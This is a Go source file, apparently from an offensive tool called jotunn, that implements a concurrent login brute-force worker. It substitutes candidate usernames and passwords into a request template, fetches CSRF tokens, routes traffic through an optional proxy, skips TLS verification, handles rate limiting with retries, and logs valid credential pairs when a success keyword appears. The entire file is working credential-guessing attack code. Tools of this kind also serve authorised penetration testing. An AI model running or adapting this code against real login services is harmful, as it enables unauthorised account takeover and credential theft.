package attack

import (
	"crypto/tls"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/LinharesAron/jotunn/internal/config"
	"github.com/LinharesAron/jotunn/internal/logger"
	"github.com/LinharesAron/jotunn/internal/utils"
)

type Attempt struct {
	Username string
	Password string
}

func Worker(id int, cfg *config.AttackConfig, jobs <-chan Attempt, retries chan<- Attempt, wg *sync.WaitGroup, limiter *RateLimitManager) {
	defer wg.Done()

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	if cfg.Proxy != "" {
		proxyURL, err := url.Parse(cfg.Proxy)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		} else {
			logger.Error("Invalid proxy URL: %s", cfg.Proxy)
		}
	}

	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}

	for attempt := range jobs {
		limiter.WaitIfBlocked()
		limiter.WaitCadence()
		limiter.RegisterRequest()

		payload := strings.ReplaceAll(cfg.Payload, "^USER^", attempt.Username)
		payload = strings.ReplaceAll(payload, "^PASS^", attempt.Password)

		if cfg.CSRFField != "" {
			csrfToken, statusCode, err := utils.RetrieveCSRFToken(client, cfg.CSRFField, cfg.CSRFSourceURL)
			if err != nil {
				if limiter.HandleIfRateLimited(statusCode, retries, attempt) {
					continue
				}

				logger.Error("[Worker %d] CSRF failed: %v", id, err)
				continue
			}

			payload = strings.ReplaceAll(payload, "^CSRF^", csrfToken)
		}

		var req *http.Request
		var err error

		if strings.ToUpper(cfg.Method) == "GET" {
			urlWithQuery := cfg.URL + "?" + payload
			req, err = http.NewRequest(cfg.Method, urlWithQuery, nil)
		} else {
			req, err = http.NewRequest(cfg.Method, cfg.URL, strings.NewReader(payload))
		}

		if err != nil {
			logger.Error("[Worker %d] Request creation error: %v\n", id, err)
			continue
		}

		for k, v := range cfg.Headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			logger.Error("[Worker %d] Request error: %v\n", id, err)
			continue
		}
		defer resp.Body.Close()

		statusCode := resp.StatusCode
		if limiter.HandleIfRateLimited(statusCode, retries, attempt) {
			continue
		}

		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			logger.Error("[Worker %d] Failed to read response body: %v", id, err)
			continue
		}

		if isValidResponse(cfg, string(bodyBytes)) {
			logger.Success("🎯 [Worker %d] Valid username:password → %s:%s", id, attempt.Username, attempt.Password)
		}

		limiter.MarkRecovered()
		logger.Progress.Inc()
	}
}

func isValidResponse(cfg *config.AttackConfig, body string) bool {
	success, keyword := cfg.Keyword()
	return success == strings.Contains(body, keyword)
}
